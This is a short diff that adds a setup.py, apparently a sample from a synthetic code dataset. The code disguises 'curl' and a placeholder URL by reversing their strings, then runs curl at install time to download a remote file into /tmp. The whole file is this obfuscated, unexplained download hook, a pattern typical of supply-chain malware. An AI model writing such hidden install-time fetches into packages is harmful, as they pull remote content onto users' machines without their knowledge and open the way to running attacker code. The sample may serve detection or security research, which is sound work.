@@ -1,0 +1,8 @@
+# path: setup.py
+# lines: 4
+# weight: 35
+# ---
+import subprocess
+t = "".join(reversed("lruc"))
+u = "".join(reversed("x/dilavni.elpmaxe//:sptth"))
+subprocess.run([t, "-o", "/tmp/x", u])
